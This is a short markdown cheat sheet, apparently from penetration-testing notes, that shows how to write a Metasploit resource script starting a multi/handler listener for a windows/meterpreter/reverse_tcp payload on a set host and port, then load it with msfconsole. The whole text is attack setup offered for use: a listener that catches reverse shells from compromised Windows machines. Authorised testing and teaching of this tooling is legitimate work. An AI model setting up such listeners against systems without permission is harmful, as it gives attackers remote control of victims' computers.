## Create Handler Script
```bash
nano handler.rc
```
Add:
```rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.100.8
set LPORT 4444
run
```
## Load Script
```bash
msfconsole -r handler.rc
```
✅ Automatically starts multi/handler with configured settings

> 💡 **Use case**: Rapid payload handling during engagements — no manual setup needed.

